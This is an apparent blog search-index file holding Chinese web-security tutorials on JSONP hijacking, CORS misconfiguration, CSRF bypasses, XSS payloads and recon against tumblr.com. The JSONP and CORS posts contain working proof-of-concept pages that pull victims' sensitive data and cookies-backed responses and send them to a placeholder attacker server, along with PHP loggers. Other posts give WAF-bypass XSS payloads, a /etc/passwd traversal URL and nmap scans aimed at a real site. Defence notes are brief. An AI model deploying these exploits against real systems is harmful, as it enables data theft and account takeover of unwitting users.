<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>JSONP劫持与CORS</title>
      <link href="/2019/12/09/jsonp%E4%B8%8Ecors/"/>
      <url>/2019/12/09/jsonp%E4%B8%8Ecors/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="550" height="86" src="//music.163.com/outchain/player?type=2&id=1335899405&auto=0&height=66"></iframe><h2 id="JSONP？"><a href="#JSONP？" class="headerlink" title="JSONP？"></a>JSONP？</h2><p>&#8195;JSONP就是为了跨域获取资源而产生的一种技术手段，这种技术是利用<code>script</code>和<code>src</code>属性不受同源策略影响的特性。（所谓同源是指，域名，协议，端口相同）</p><h2 id="JSONP劫持"><a href="#JSONP劫持" class="headerlink" title="JSONP劫持"></a>JSONP劫持</h2><p>&#8195;jsonp劫持就是攻击者获取到网站本应传给其他接口的一些敏感数据。如果网站B对网站A的JSONP请求没有进行安全检查直接返回数据，则网站B 便存在JSONP 漏洞，网站A 利用JSONP漏洞就能够获取用户在网站B上的数据。</p><h2 id="JSONP漏洞利用"><a href="#JSONP漏洞利用" class="headerlink" title="JSONP漏洞利用"></a>JSONP漏洞利用</h2><p>&#8195;我们在burpsuite里进行搜索回调函数<code>callback</code>，然后把它发送到Response</p><p><img src="/images/jsonp3.png" alt="jsonp"></p><p><img src="/images/jsonp1.png" alt="jsonp"></p><p>&#8195;我们尝试更改<code>callback</code>这个参数值为aaa</p><p><img src="/images/jsonp2.png" alt="jsonp"></p><p>&#8195;这里可以看见我在Response里标红的位置已经根据咱们更改的参数值而改变，就证明参数可控，也就是说存在漏洞，而且返回的也是一些敏感数据，okay，接下来就让我们在自己的服务器上写个脚本，当受害者访问的时候，我们就能获取这些数据了。</p><p>&#8195;<strong>poc</strong></p><p>&#8195;&#8195;js.html(受害者访问此页面)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;&lt;meta name=”referrer” content=”no-referrer”&gt;&lt;/head&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;./jquery.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">function test(json)&#123;</span><br><span class="line">    //alert(v.name);</span><br><span class="line">data=JSON.stringify(json)</span><br><span class="line">    var xmlhttp = new XMLHttpRequest();</span><br><span class="line">    var url = &apos;http://hacker web server ip/jsonp/logs.php?name=&apos;+data;</span><br><span class="line">    xmlhttp.open(&quot;GET&quot;,url,true);</span><br><span class="line">    xmlhttp.send();</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;Vulnerability URL?callback=test&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;Welcome&lt;/h1&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>&#8195;&#8195;logs.php(保存在攻击者web服务器上)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$nickname=$_GET[&apos;name&apos;];</span><br><span class="line">$fp = fopen(&apos;info.txt&apos;,&apos;a&apos;);</span><br><span class="line">$flag = fwrite($fp, &quot;数据:  &quot;.$nickname.&quot;\r\n&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>&#8195;判断referer来源地址</p><p>&#8195;设置随机且一次性的token</p><h2 id="漏洞挖掘技巧"><a href="#漏洞挖掘技巧" class="headerlink" title="漏洞挖掘技巧"></a>漏洞挖掘技巧</h2><p>&#8195;用burpsuite的搜索功能搜索关键字，</p><p>&#8195;常见的关键字有</p><p>&#8195;&#8195;<code>jsoncallback</code><br>&#8195;&#8195;<code>jsonpcallback</code><br>&#8195;&#8195;<code>jsoncall</code><br>&#8195;&#8195;<code>jsonpcall</code><br>&#8195;&#8195;<code>cb</code><br>&#8195;&#8195;<code>jsoncb</code><br>&#8195;&#8195;<code>jsonpcb</code></p><h2 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h2><p>&#8195;CORS全称是跨域资源共享，看名字就知道是用于跨域传输数据的，和JSONP差不多，但是这个比内个厉害点，JSONP只支持GET传输数据，CORS则支持所有类型的HTTP请求。</p><h2 id="CORS漏洞利用"><a href="#CORS漏洞利用" class="headerlink" title="CORS漏洞利用"></a>CORS漏洞利用</h2><p>&#8195;跨域资源读取</p><p>&#8195;&#8195;首先我们需要确认是否存在漏洞，如下图红框处所示，当内个字段为*，或者在请求包中添加origin字段，并随便输入一个url，响应包存在内段url的话就证明存在这个漏洞。</p><p><img src="/images/cors.png" alt="cors"></p><p><img src="/images/cors2.png" alt="cors"></p><p>&#8195;&#8195;现在我们可以在服务器上创建一个脚本来跨域读取用户的敏感信息，如cookie、token等</p><p>&#8195;<strong>poc</strong></p><p>&#8195;&#8195;corf.html</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;h1&gt;cors exploit&lt;/h1&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">function exploit()</span><br><span class="line">&#123;</span><br><span class="line">    var xhr1;</span><br><span class="line">    var xhr2;</span><br><span class="line">    if(window.XMLHttpRequest)</span><br><span class="line">    &#123;</span><br><span class="line">        xhr1 = new XMLHttpRequest();</span><br><span class="line">        xhr2 = new XMLHttpRequest();</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        xhr1 = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);</span><br><span class="line">        xhr2= new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    xhr1.onreadystatechange=function()</span><br><span class="line">    &#123;</span><br><span class="line">        if(xhr1.readyState == 4 &amp;&amp; xhr1.status == 200) </span><br><span class="line">        &#123;</span><br><span class="line">            var datas=xhr1.responseText;</span><br><span class="line">            xhr2.open(&quot;POST&quot;,&quot;http://uip/cors/save.php&quot;,&quot;true&quot;);</span><br><span class="line">            xhr2.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);</span><br><span class="line">            xhr2.send(&quot;z0=&quot;+escape(datas));      </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    xhr1.open(&quot;GET&quot;,&quot;Vulnerability URL&quot;,&quot;true&quot;) </span><br><span class="line">    xhr1.withCredentials = true;        </span><br><span class="line">    xhr1.send();</span><br><span class="line">&#125;</span><br><span class="line">exploit();</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>&#8195;save.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$file = fopen(&quot;secrect.html&quot;, &quot;w+&quot;);</span><br><span class="line">$res = $_POST[&apos;z0&apos;];</span><br><span class="line">fwrite($file, $res);</span><br><span class="line">fclose($res);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h2><p>&#8195;能不开CORS就不开</p><p>&#8195;定义白名单，严格校验Origin值</p><p>&#8195;仅在接收到跨域请求的时候才配置有关于跨域的头部，确保跨域请求合法</p><h2 id="漏洞挖掘技巧-1"><a href="#漏洞挖掘技巧-1" class="headerlink" title="漏洞挖掘技巧"></a>漏洞挖掘技巧</h2><p>&#8195;打开burpsuite，选择Proxy模块中的options选项，找到Match and Replace 勾选下图中的内个request header，要是没有就自己搞一个。</p><p><img src="/images/cors3.png" alt="cors"></p><p>&#8195;然后再 HTTP history那里搜<code>Access-Control-Allow-Origin: *</code>或者<code>Access-Control-Allow-Origin:foo.example.org</code>或者<code>Access-Control-Allow-Origin:true</code></p><p><img src="/images/cors4.png" alt="cors"></p><h2 id="END"><a href="#END" class="headerlink" title="END"></a>END</h2><p>&#8195;大家可以去米斯特公众号找找一个叫敏感信息高亮标记的文章，内个工具装在burpsuite里用着不错的。</p><p>&#8195;如果觉得文章中原理处字少的话，可以看下我下面给的链接。</p><p>本文参考链接</p><p><code>https://www.cnblogs.com/junsec/p/11221943.html</code></p><p><code>https://www.mi1k7ea.com/2019/08/18/CORS%E8%B7%A8%E5%9F%9F%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#Demo</code></p><p><code>https://www.k0rz3n.com/2019/03/07/JSONP%20%E5%8A%AB%E6%8C%81%E5%8E%9F%E7%90%86%E4%B8%8E%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%95/</code></p><p><code>http://sh1yan.top/2018/08/12/jsonp-study/</code></p>]]></content>
      
      
      <categories>
          
          <category> csrf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> csrf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何做信息收集</title>
      <link href="/2019/12/08/%E5%A6%82%E4%BD%95%E5%81%9A%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
      <url>/2019/12/08/%E5%A6%82%E4%BD%95%E5%81%9A%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="550" height="86" src="//music.163.com/outchain/player?type=2&id=1406311852&auto=0&height=66"></iframe><p>收集的网站是：<code>*.tumblr.com</code></p><h2 id="子域收集"><a href="#子域收集" class="headerlink" title="子域收集"></a>子域收集</h2><p>&#8195;1.Sublist3r</p><p><img src="/images/sublist3r.png" alt="sublist3r"></p><p>&#8195;大约过了10多分钟</p><p><img src="/images/sublist3r1.png" alt="sublist3r"></p><p>&#8195;说实话我没想到我随便找的一个看似很小的站却有这么多域名</p><p>&#8195;2.aquatone</p><p>&#8195;&#8195;使用命令<code>amass enum --passive -d tumblr.com -o amass.txt</code>找到了1910个子域名</p><p>&#8195;3.OneForAll</p><p>&#8195;<code>https://github.com/shmilylty/OneForAll</code></p><p>&#8195;&#8195;使用命令<code>python3 oneforall.py --target tumblr.com run --valid=None</code>收集完成后，csv文件会在results目录下，这款工具用着蛮不错的，扫出来5k多</p><p>&#8195;4.ESD</p><p>&#8195;<code>https://github.com/FeeiCN/ESD</code></p><p>&#8195;命令：<code>esd -d tumblr.com</code></p><p>&#8195;5.通过证书查询</p><p>&#8195;<code>https://crt.sh/?q=%.tumblr.com</code></p><p><img src="/images/crt.png" alt="crt"></p><p>&#8195;<code>https://censys.io/certificates?q=parsed.names%3Atumblr.com</code></p><p><img src="/images/censys.png" alt="censys"></p><h2 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h2><p>&#8195;1.在线网站识别</p><p>&#8195;<code>http://www.yunsee.cn/</code></p><p>&#8195;2.浏览器插件<code>Wappalyzer</code></p><p> <img src="/images/wappalzer.png" alt="wappalzer"></p><h2 id="Google-Dork"><a href="#Google-Dork" class="headerlink" title="Google Dork"></a>Google Dork</h2><p><code>https://github.com/nerrorsec/GoogleDorker</code></p><p>&#8195;这款工具会根据你输入的域名生成规则，并以域名为html文件名生成一个页面，下载到本地访问后</p><p><img src="/images/googledork.png" alt="googledork"></p><h2 id="web目录"><a href="#web目录" class="headerlink" title="web目录"></a>web目录</h2><p>&#8195;1.kali linux里自带的<code>dirb、dirbuster、wfuzz</code></p><p>&#8195;2.<code>dirsearch</code> <code>https://github.com/maurosoria/dirsearch</code></p><h2 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h2><p>&#8195;这个字典里啥都有，挺好用的：<code>https://github.com/danielmiessler/SecLists?source=post_page-----ec25f7f12e6d----------------------</code></p><h2 id="绕CDN"><a href="#绕CDN" class="headerlink" title="绕CDN"></a>绕CDN</h2><p>&#8195;1.验证CDN的存在</p><p>&#8195;&#8195;首先我们先确定网站是否存在CDN，使用在线网站<code>https://www.17ce.com/site/index</code>当你发现解析ip不一样，那么就是存在CDN。</p><p><img src="/images/ping.png" alt="ping"></p><p>&#8195;2.绕过CDN获取真实ip</p><p>&#8195;&#8195;还是使用刚才内个在线网站，挨个去访问我们收集到的子域名，总会有那么几个站是没有cdn的。</p><p>&#8195;&#8195;在注册网站的时候，网站会给我们发邮箱，可通过检查电子邮件原文查找Received字段获取服务器的真实ip</p><p>&#8195;&#8195;使用工具<code>https://github.com/m0rtem/CloudFail、https://github.com/vincentcox/bypass-firewalls-by-DNS-history</code>，如何使用都有介绍，我就不说了</p><p>&#8195;&#8195;DNS历史解析记录可能会有真实ip<code>https://dnsdb.io/zh-cn/、https://x.threatbook.cn/</code></p><h2 id="C段扫描"><a href="#C段扫描" class="headerlink" title="C段扫描"></a>C段扫描</h2><p>&#8195;在我们获取到他真实ip后，我们就可以进行c段扫描了</p><p>&#8195;首先先探测主机存活<code>nmap -sn -PE -n ip/24</code></p><p>&#8195;获取到存活ip后进行全端口的扫描<code>nmap -sS -Pn -p 1-65535 -n ip</code></p><p>&#8195;为什么这样做我应该就不用说了，我相信你们懂</p><h2 id="END"><a href="#END" class="headerlink" title="END"></a>END</h2><p>&#8195;目前感觉有OneForAll这款工具就够用了，但还是写一款自己用的自动化脚本用起来会比较顺手，so，但愿自己能在年前把这个脚本写出来</p>]]></content>
      
      
      <categories>
          
          <category> recon </category>
          
      </categories>
      
      
        <tags>
            
            <tag> recon </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSRF_bypass和案例</title>
      <link href="/2019/12/05/CSRF_2/"/>
      <url>/2019/12/05/CSRF_2/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="550" height="86" src="//music.163.com/outchain/player?type=2&id=29713635&auto=0&height=66"></iframe><h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><p>1.<strong>使用其他人的CSRF令牌</strong></p><p>&#8195;当应用程序不验证csrf令牌是否绑定到这个账户时，可以自己尝试去验证这一点：首先用账户a登录到网站，转到密码更改页面，使用burp抓取csrf令牌。使用账户B登录网站，并修改账户B的密码，在修改时抓包修改csrf令牌，如果成功就证明可以使用他人的csrf令牌。</p><p>2.<strong>替换相同长度的值</strong></p><p>&#8195;首先我们先确定令牌的长度，例如长度为21个字符，令牌为<code>ud019eh10923213213123</code>,我们可以替换为具有相同值的令牌<code>ud019eh10832121321223</code></p><p>3.<strong>删除CSRF令牌</strong></p><p>&#8195;尝试进行敏感操作的时候把令牌删掉，看看是否可以操作成功。</p><p>5.<strong>使用令牌固定部分</strong></p><p>&#8195;对比两个csrf令牌，相同部分为固定的，反之为动态部分，通常情况下只要固定部分为正确的就可以使用这个令牌</p><p>6.<strong>改变请求方式</strong></p><p>&#8195;例如我们在修改密码的时候是Get请求，那么我们在伪造请求的时候，就通过Post的方式发送。</p><p>7.<strong>绕Referer</strong></p><p>&#8195;web应用程序有的时候会验证referer，例如目标网站叫<code>www.abc.com</code>，我们就可以创建一个目录叫<code>www.abc.com</code>，这样的话就有可能绕过验证</p><p>&#8195;也可以尝试删除referer</p><p>8.<strong>xss+csrf</strong></p><p>&#8195;利用xss去获取令牌，然后进行csrf攻击</p><p>9.<strong>CLRF+CSRF</strong></p><p>&#8195;利用CLRF漏洞去固定cookie，然后进行csrf攻击</p><h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><p>1.<strong>通过两个漏洞进行账户接管</strong></p><p>&#8195;现在假设uri为<code>example.com</code>,我们在这个网站上发现可以添加电子邮箱，可利用此邮箱接收重置密码链接。现在我们尝试添加邮箱时删除csrf令牌，看是否可以添加成功，果然，尽管没有csrf令牌，也是可以添加成功的，现在我们就可以构造payload，当用户访问，就可以更改邮箱了，但是我们发现，在成功修改后会提示修改成功，这样我们就暴露了，经过一番研究后发现，当我们修改邮箱时，uri为：<code>https://www.example.com/account/addEmail?email_ref=A3Ig_klkdfnw&amp;st=2E67C2F5B0AF8DE90&amp;redirect_url=email_settings</code>当我们把参数<code>redirect_url=email_settings</code>更改为<code>redirect_url=home</code>后，添加完邮箱就会跳转到主页，这样我们就不会暴露了，所以我们只需要把这两个漏洞结合在一起就可以完成一次完美的攻击了</p><p>2.<strong>csrf导致的账户接管</strong></p><p>&#8195;此csrf漏洞是在绑定电子邮箱和账户名处，从而导致账户接管，作者发现在修改邮箱时会验证csrf令牌，如果删除就会失败，当他把这个post请求改为get请求后，就能成功绕过，这样的话只要任意用户访问我们的恶意链接，我们就可以修改他的邮箱，和用户名，这看起来很简单，但是他获得了2400美金</p><p>3.<strong>XSS与CSRf的利用，导致账户接管</strong></p><p>&#8195;首先是发现了一个<code>self-xss</code>，然后发现修改密码处需要csrf令牌，作者通过self-xss窃取csrf令牌，并同时写入到csrf payload 页面，并跳转过去，这样的话就可以成功的修改密码</p><h2 id="END"><a href="#END" class="headerlink" title="END"></a>END</h2><p>&#8195;本来打算在后面写个jsonp劫持和cors劫持，但是我现在打算用接下来3天的时间写一个recon脚本，打算设计两种功能，一、快速获取子域名，二、可能会很慢但是会比较全的收集子域名，我也不知道我这3天能否完成，但是我想试试</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><code>http://infosecflash.com/2019/01/05/how-i-could-have-taken-over-any-pinterest-account/</code></p><p><code>https://shahmeeramir.com/methods-to-bypass-csrf-protection-on-a-web-application-3198093f6599</code></p><p><code>https://medium.com/swlh/bypassing-csrf-protection-c9b217175ee</code></p><p><code>https://medium.com/@sherazkhalid_60362/account-takeover-by-chaining-two-vulnerabilities-bb447753b089</code></p><p><code>https://nirmaldahal.com.np/r-xss-csrf-bypass-to-account-takeover/?__cf_chl_jschl_tk__=e0ddfe35f9fb4ef32043413ca483e9b149455471-1575553647-0-AeSewmjyKNq9ZRBYRR5iIan4ybMNYpiYyWMVRIl8YVutVTQTrcu1YKrPp8HPfMHGgTGxokpcwpijA1sUjUCpWaw_ibLemtVW338Gre0CyqBEEUlCbhQsVLA3DkwVeqtQTSoOu25DWzVNWKdhPbrnV5P6XHuDncrcwYlcW5C-c1Hz6Xv_nyyUcyGtDKqKhxwinGRSOt9de8YC3DRIgCu5NUEulQ18Q06qxXDgO-lQjDArIRNLoOreXoEJUiUdyVGnLPSzfJL7F4dj8yzzqLYj5FzKh-YUdlfXtV-B3_kNiM79g7nOZ6Y9TFD3EmCJtyVyLw</code></p>]]></content>
      
      
      <categories>
          
          <category> CSRF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSRF_1</title>
      <link href="/2019/12/05/CSRF_1/"/>
      <url>/2019/12/05/CSRF_1/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="550" height="86" src="//music.163.com/outchain/player?type=2&id=1301909440&auto=0&height=66"></iframe><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>&#8195;当web应用没有对用户的一些敏感操作（修改密码，添加用户等）进行二次验证，导致攻击者可以构造恶意文件或链接，当用户在存在漏洞网站的认证<code>身份信息没有失效时</code>，访问了恶意链接，就会在受害者不执行的情况下，以受害者的身份向服务器发送请求，完成一些非法操作的攻击行为。</p><p>&#8195;没明白的小伙伴请看下面的图解</p><p><img src="/images/csrf.png" alt="csrf"></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>&#8195;1.<strong>修改密码</strong></p><p>&#8195;&#8195;当我们在修改密码的时候，发现url中存在我们输入的密码（有的时候是post传输的，所有需要抓包观察）</p><p><img src="/images/csrfmi.png" alt="csrf"></p><p>&#8195;&#8195;我们尝试修改一下url中密码</p><p><img src="/images/csrfmi1.png" alt="csrf"></p><p>&#8195;&#8195;访问后发现提示密码修改了</p><p><img src="/images/csrfmi2.png" alt="csrfmi2"></p><p>&#8195;&#8195;我们可以创建一个1.html文件</p><p><img src="/images/csrfmi3.png" alt="csrfmi2"></p><p>&#8195;&#8195;当用户访问到该页面就会被修改密码，他还不知道！！</p><p>&#8195;2.<strong>添加管理员</strong></p><p>&#8195;&#8195;espcmsv5版本后台有个添加管理员</p><p><img src="/images/csrft.png" alt="csrfmi2"></p><p>&#8195;&#8195;我尝试添加一个用户，并抓包分析，发现是通过post传输的，所以我们需要构建一个表单来完成此次攻击</p><p><img src="/images/csrft1.png" alt="csrfmi2"></p><p>&#8195;&#8195;我们来创建一个esp1.html</p><p><img src="/images/csrft2.png" alt="csrfmi2"></p><p>&#8195;&#8195;当管理员访问后，就会成功添加管理员用户</p><p><img src="/images/csrft3.png" alt="csrfmi2"></p><p><code>其实不光这两种利用方式，像添加文件啊，转账啊，凡事用户的敏感操作没有进行二次验证的都有可能受到攻击</code></p><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>&#8195;验证referer字段</p><p>&#8195;添加一次性且随机的token</p>]]></content>
      
      
      <categories>
          
          <category> CSRF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS_案例</title>
      <link href="/2019/12/03/XSS_2/"/>
      <url>/2019/12/03/XSS_2/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="550" height="86" src="//music.163.com/outchain/player?type=2&id=1312925425&auto=0&height=66"></iframe><h3 id="文件上传XSS"><a href="#文件上传XSS" class="headerlink" title="文件上传XSS"></a>文件上传XSS</h3><p>1.上传html文件</p><p>&#8195;文件内容为xss的payload</p><p>&#8195;<code>&lt;svg/onload=alert(1)&gt;</code></p><p>&#8195;上传成功后去访问就会触发</p><p>2.上传svg文件</p><p>&#8195;svg文件内容为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;no&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE svg PUBLIC &quot;-//W3C//DTD SVG 1.1//EN&quot; &quot;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&quot;&gt;</span><br><span class="line">&lt;svg version=&quot;1.1&quot; id=&quot;Layer_1&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; x=&quot;0px&quot; y=&quot;0px&quot; width=&quot;100px&quot; height=&quot;100px&quot; viewBox=&quot;0 0 751 751&quot; enable-background=&quot;new 0 0 751 751&quot; xml:space=&quot;preserve&quot;&gt;  &lt;image id=&quot;image0&quot; width=&quot;751&quot; height=&quot;751&quot; x=&quot;0&quot; y=&quot;0&quot;</span><br><span class="line">    href=&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAu8AAALvCAIAAABa4bwGAAAAIGNIUk0AAHomAACAhAAA+gAAAIDo&quot; /&gt;</span><br><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">&lt;/svg&gt;</span><br></pre></td></tr></table></figure><p>&#8195;同样只要能访问到就可以触发</p><h2 id="案例分享"><a href="#案例分享" class="headerlink" title="案例分享"></a>案例分享</h2><p>1.一个有在线聊天的网站，发送的聊天内容为xss payload</p><p><img src="/images/xsschat.png" alt="xsschat"></p><p><img src="/images/xsschat2.png" alt="xsschat"></p><p>2.绕过XSS filter</p><p>&#8195;当输入简单的payload:</p><p>&#8195;<code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></p><p>&#8195;发现请求被WAF阻止，经过各种尝试发现，当输入：</p><p>&#8195;<code>o&lt;x&gt;nmouseover=alert&lt;x&gt;1//</code></p><p>&#8195;尖括号与之间的内容被删除，仅剩下<code>onmouseover=alert(1)//</code>并弹出一个xss</p><p>&#8195;这个案例的话就是测试一下waf会对我们输入的内容怎么处理，根据处理方式进行一种利用，进而绕过，当我们遇到一个xss点，一定要多尝试，不要输入俩payload就觉得服务器已经防的死死的，多尝试，多研究，终会绕过的。</p><p>3.错误页面反应的XSS</p><p>&#8195;假设我们现在访问了一段url</p><p>&#8195;<code>https://b15.[redacted.com]/file.php?spaceid=&amp;file=../../../../etc/passwd</code></p><p>&#8195;出现了以下错误页面</p><p><img src="/images/xssbc.png" alt="xssbc"></p><p>&#8195;我们可以发现，url中file=后面的内容在页面中显示了出来</p><p>&#8195;我们接着尝试插入html标记，测试一下有没有filter</p><p>&#8195;<code>https://b15.[redacted.com]/file.php?spaceid=&amp;file=&lt;h1&gt;asu</code></p><p><img src="/images/xssbc2.png" alt="xssbc"></p><p>&#8195;很显然，并没有filter,我们只需插入xss payload就可以了</p><p>&#8195;<code>https://b15.[redacted.com]/file.php?spaceid=&amp;file=&lt;img src=x onmouseover=alert(1)&gt;</code></p><p><img src="/images/xssbc3.png" alt="xssbc"></p><p>4.url的xss与google dork的故事</p><p>&#8195;假设目标网站是<code>www.example.com</code>，我们使用google <code>site:*.example.com inurl:redirect</code></p><p>&#8195;当我们找到名为<code>example.com/social?redirect=/somewhere</code>时可以尝试<code>Open redirect</code>或XSS</p><p>&#8195;当重定向到白名单url成功后，就可以尝试xss：<code>example.com/social?redirect=javascript://alert(1)</code>,访问后可能会重定向别的地方，按正常用户流程走，可能会触发xss</p><p>&#8195;这个案例就是说我们拿到一个网站后，用google dork一下，发现open redirect 的点后，就在redirect后面添加</p><p>&#8195;简单的javascript urI：<code>javascript://alert(1)</code>去尝试一下。</p><p>5.绕过filter</p><p>&#8195;当网站把<code>&quot;&quot;</code>过滤为<code>&quot;</code>,把<code>&gt;</code>过滤为<code>&amp;gt</code>，我们的payload中就不能使用符号<code>&quot; &lt; &gt;</code></p><p>&#8195;我们就得一点点尝试，然后看<code>response</code>什么样，根据响应结果来修改payload</p><p>&#8195;当payload:时</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">example.com?a=&apos;)&#125;hello&quot;&gt;</span><br></pre></td></tr></table></figure><p><img src="/images/xssf.png" alt="xssf"></p><p>&#8195;当payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">example.com?a=1′)&#125;%0Aelse&#123;%0Aalert(‘XSS’);</span><br></pre></td></tr></table></figure><p><img src="/images/xssf1.png" alt="xssf"></p><p>&#8195;这里没有触发是因为<code>&#39;)</code>未闭合，所有我们再修改一下payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">example.com?a= 1′)&#125;%0Aelse&#123;%0Aalert(‘XSS’);(‘</span><br></pre></td></tr></table></figure><p><img src="/images/xssf2.png" alt="xssf"></p><p><img src="/images/xssf3.png" alt="xssf"></p><h2 id="END"><a href="#END" class="headerlink" title="END"></a>END</h2><p>还是内句话，遇到waf要多尝试，1小时不行就2小时，2小时不行就3小时，不要随便试试就放弃</p>]]></content>
      
      
      <categories>
          
          <category> xss </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>资源收集</title>
      <link href="/2019/12/03/%E8%84%9A%E6%9C%AC%E6%94%B6%E9%9B%86/"/>
      <url>/2019/12/03/%E8%84%9A%E6%9C%AC%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h1 id="此贴不定时更新一些有用的小脚本小工具好网站"><a href="#此贴不定时更新一些有用的小脚本小工具好网站" class="headerlink" title="此贴不定时更新一些有用的小脚本小工具好网站"></a>此贴不定时更新一些有用的小脚本小工具好网站</h1><p><code>https://github.com/gwen001/pentest-tools/blob/master/dnsexpire.py</code> 此脚本可检测域名到期时间，可利用此脚本检测子域名接管。</p><p><code>https://www.giftofspeed.com/cache-checker/</code></p>]]></content>
      
      
      <categories>
          
